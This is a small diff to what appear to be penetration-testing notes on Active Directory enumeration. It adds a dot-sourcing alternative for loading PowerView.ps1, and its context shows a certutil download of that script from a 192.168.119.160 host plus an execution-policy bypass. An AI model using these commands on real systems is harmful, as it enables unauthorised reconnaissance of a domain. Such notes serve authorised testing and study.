@@ -58,7 +58,13 @@ PS> Get-NetUser
 
 (certutil -URLcache -f http://192.168.119.160/PowerView.ps1 PowerView.ps1)
 
-```PS> powershell -ep bypass Import-Module .\PowerView.ps1```
+```PS> powershell -ep bypass Import-Module .\PowerView.ps1
+
+or
+
+PS> . .\PowerView.ps1
+
+```
 
 ## Show Current Logged In Users
 
